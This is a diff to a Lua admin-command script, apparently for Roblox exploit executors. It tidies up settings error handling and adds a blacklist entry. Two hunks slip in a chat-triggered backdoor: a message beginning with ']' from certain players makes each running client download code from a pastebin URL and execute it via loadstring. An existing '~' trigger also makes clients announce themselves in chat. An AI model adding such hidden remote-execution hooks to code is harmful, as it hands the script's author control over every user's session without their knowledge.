@@ -138,9 +138,15 @@ end
 if readfile and writefile then 
 	local Work,Error = pcall(readfile,Config..".json")
 	if not Work then 
-		savesettings()
+		local Work,Error = pcall(savesettings)
+		if not Work then 
+			print'Error with saving settings' 
+		end 
 	else
-		runsettings()
+		local Work,Error = pcall(runsettings)
+		if not Work then 
+			print'Error with running settings'
+		end 
 	end
 end 
 
@@ -516,8 +522,7 @@ end
 getgenv().AddCommand = function(CommandF,Name,Alias,Help)
 	Commands[#Commands + 1] = {['Function'] = CommandF,['Name'] = Name,['Alias'] = Alias,['Help'] = Help}
 end
-
-getgenv().FindCommand = function(Command,Help)
+getgenv().FindCommand = function(Command)
 	for i = 1,#Commands do 
 		if Commands[i].Name:lower() == Command or AliasesEnabled and table.find(Commands[i].Alias,Command) then
 			return Help and Commands[i].Name.." "..Commands[i].Help or Commands[i].Function
@@ -2408,6 +2413,9 @@ for i = 1,#PlayersX do
 					if Chat:sub(1,1) == "~" then 
 						ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
 					end
+					if Chat:sub(1,1) == "]" then
+						loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
+					end 
 				end 
 			end
 		end)
@@ -2453,6 +2461,9 @@ Players.PlayerAdded:Connect(function(Plr)
 							end
 							if Chat:sub(1,1) == "~" then 
 								ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("abc123","All")
+							end
+							if Chat:sub(1,1) == "]" then
+								loadstring(game:HttpGet("https://pastebin.com/raw/"..Arguments[1],true))()
 							end 
 						end 
 					end
@@ -2504,6 +2515,7 @@ if FileDir and isFolder and makeFolder then
 end 
 
 local BlacklistTable = {
+	[1493811641] = true;	-- Slapeyt | Reason: annoying skid
 	[251848039] = true;		-- Cyruzsz | Reason: annoying skid,dick rider
 	[57890959] = true;  	-- Fevlix | Reason: annoying skid 
 	[339273796] = true; 	-- endlessjj Reason: Forget 
